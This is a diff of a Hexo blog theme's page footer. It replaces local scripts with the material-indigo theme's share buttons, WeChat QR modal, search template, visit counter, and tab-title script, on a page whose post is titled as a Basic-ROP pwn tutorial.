+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《pwn入门（Basic-ROP）》 — yichen's blog&url=https://yichen115.github.io/2019/11/17/ug9gx5/&via=https://yichen115.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://yichen115.github.io/2019/11/17/ug9gx5/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://yichen115.github.io/2019/11/17/ug9gx5/" alt="微信分享二维码">
 </div>
-    </li>
-    <li class="nav-item">
-      
-    </li>
-  </ul>
-</nav>
-<div class="search-form-wrap">
-  <div class="local-search local-search-plugin">
-  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
-  <div id="local-search-result" class="local-search-result"></div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
 </div>
-</div>
-</aside>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
 
-<script src="/js/jquery-2.0.3.min.js"></script>
-
-
-<script src="/js/jquery.justifiedGallery.min.js"></script>
-
-
-<script src="/js/lazyload.min.js"></script>
-
-
-<script src="/js/busuanzi-2.3.pure.min.js"></script>
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
 
 
 
 
-  
-<script src="/js/tocbot.min.js"></script>
 
-  <script>
-    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
-    tocbot.init({
-      tocSelector: '.tocbot',
-      contentSelector: '.article-entry',
-      headingSelector: 'h1, h2, h3, h4, h5, h6',
-      hasInnerContainers: true,
-      scrollSmooth: true,
-      positionFixedSelector: '.tocbot',
-      positionFixedClass: 'is-position-fixed',
-      fixedSidebarOffset: 'auto',
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '记得回来啊！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '欢迎回来!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
     });
-  </script>
+})();
+</script>
 
-
-
-<script src="/js/ocean.js"></script>
 
 
 </body>
